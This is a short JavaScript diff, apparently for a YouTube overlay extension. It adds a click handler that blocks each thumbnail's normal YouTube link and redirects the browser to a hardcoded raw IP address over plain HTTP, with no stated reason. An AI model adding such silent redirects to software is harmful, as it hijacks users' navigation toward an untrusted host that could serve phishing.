@@ -130,6 +130,12 @@ const createOverlay = () => {
                 thumbnail.style.transform = 'scale(1)';
                 overlayDiv.style.backgroundColor = 'transparent';
             });
+
+            // 🔹 썸네일 클릭 시 페이지 이동
+            thumbnail.addEventListener('click', e => {
+                e.preventDefault(); // 기존 유튜브 링크 이동 방지
+                window.location.href = 'http://52.78.136.69'; // 페이지 이동
+            });
         });
 
     document.body.appendChild(overlay);
